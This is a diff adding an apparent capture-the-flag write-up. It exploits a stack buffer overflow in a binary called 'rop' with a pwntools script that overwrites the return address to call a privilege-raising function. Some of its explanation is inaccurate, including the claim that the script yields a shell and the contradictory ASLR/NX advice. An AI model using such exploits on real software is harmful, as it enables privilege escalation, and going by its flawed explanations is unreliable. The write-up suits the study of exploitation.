@@ -1,0 +1,79 @@
+To solve this challenge using `pwntools`, you need to exploit the buffer overflow in the `vulnerable_function` and use Return-Oriented Programming (ROP) to call the `be_nice_to_people` function, which sets the group ID. This will allow you to escalate your privileges. Here are the steps and the corresponding code to achieve this:
+
+### Steps
+
+1. **Analyze the Binary:**
+   - The binary is a 32-bit ELF file.
+   - The `vulnerable_function` reads 256 bytes into a 136-byte buffer, causing a buffer overflow.
+   - The `be_nice_to_people` function sets the group ID, which can be used to escalate privileges.
+
+2. **Find the Offset:**
+   - Determine the offset at which the return address is overwritten by the buffer overflow.
+
+3. **Find ROP Gadgets:**
+   - Use `ROPgadget` or `pwntools` to find useful gadgets in the binary and the libc.
+
+4. **Craft the Payload:**
+   - Create a payload that overwrites the return address with the address of the `be_nice_to_people` function.
+
+5. **Exploit the Buffer Overflow:**
+   - Send the crafted payload to the binary to trigger the buffer overflow and execute the `be_nice_to_people` function.
+
+### Code
+
+Here is the Python script using `pwntools` to solve the challenge:
+
+```python
+from pwn import *
+
+# Set up the process
+elf = ELF('rop')
+p = process(elf.path)
+
+# Find the offset
+offset = 136 + 4  # 136 bytes for the buffer + 4 bytes for the saved EBP
+
+# Find the address of be_nice_to_people
+be_nice_to_people_addr = elf.symbols['be_nice_to_people']
+
+# Craft the payload
+payload = b'A' * offset
+payload += p32(be_nice_to_people_addr)
+
+# Send the payload
+p.sendline(payload)
+
+# Interact with the process
+p.interactive()
+```
+
+### Explanation
+
+1. **Set up the process:**
+   - `elf = ELF('rop')`: Load the binary.
+   - `p = process(elf.path)`: Start the process.
+
+2. **Find the offset:**
+   - The buffer size is 136 bytes, and the saved EBP takes 4 bytes. Therefore, the total offset to overwrite the return address is `136 + 4`.
+
+3. **Find the address of `be_nice_to_people`:**
+   - `be_nice_to_people_addr = elf.symbols['be_nice_to_people']`: Get the address of the `be_nice_to_people` function.
+
+4. **Craft the payload:**
+   - `payload = b'A' * offset`: Fill the buffer and the saved EBP with 'A's.
+   - `payload += p32(be_nice_to_people_addr)`: Append the address of `be_nice_to_people` to overwrite the return address.
+
+5. **Send the payload:**
+   - `p.sendline(payload)`: Send the payload to the binary.
+
+6. **Interact with the process:**
+   - `p.interactive()`: Drop into an interactive shell to interact with the process.
+
+### Additional Considerations
+
+- **ASLR (Address Space Layout Randomization):**
+  - If ASLR is enabled, you may need to leak a memory address to calculate the base address of the binary or libc.
+- **NX (No-eXecute) Bit:**
+  - If the NX bit is enabled, you cannot execute code on the stack. In this case, ROP is the way to go.
+
+This script should work if the binary does not have ASLR or NX enabled. If these protections are enabled, you will need to adapt the script to handle them.
